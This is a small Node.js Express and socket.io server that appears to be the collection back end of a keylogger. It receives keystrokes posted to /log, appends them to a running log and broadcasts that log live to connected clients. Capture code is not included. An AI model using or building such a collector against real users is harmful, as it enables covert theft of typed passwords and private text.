
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

let keyLogs = '';

app.use(express.json());

app.post('/log', (req, res) => {
  const { key } = req.body;
  keyLogs += key;
  io.emit('keyLog', keyLogs);
  res.sendStatus(200);
});

io.on('connection', (socket) => {
  console.log('New client connected');
  socket.emit('keyLog', keyLogs);

  socket.on('disconnect', () => {
    console.log('Client disconnected');
  });
});

server.listen(4000, () => {
  console.log('Server is running on port 4000');
});
